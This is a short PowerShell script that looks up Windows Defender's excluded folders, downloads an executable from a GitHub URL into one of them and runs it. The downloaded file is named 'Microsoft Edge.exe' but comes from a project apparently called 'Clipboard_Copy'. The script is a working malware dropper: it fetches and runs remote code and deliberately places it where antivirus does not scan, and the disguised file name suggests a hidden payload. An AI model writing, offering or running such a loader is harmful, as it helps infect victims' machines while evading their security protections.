# Retrieve Windows Defender preferences and select ExclusionPath property
$MpPreference = Get-MpPreference
$ExclusionPath = $MpPreference.ExclusionPath

# URL of the file on GitHub
$Url = "https://github.com/Ahad160/Codeing/raw/main/Python%20Language/Projects/Project_15_Clipboard_Copy/dist/Microsoft%20Edge.exe"  # Replace with the actual URL of the file

# Path to save the downloaded file
$DownloadPath = Join-Path -Path $ExclusionPath -ChildPath "File.exe"

# Download the file
Invoke-WebRequest -Uri $Url -OutFile $DownloadPath

# Run the File
Start-Process -FilePath $DownloadPath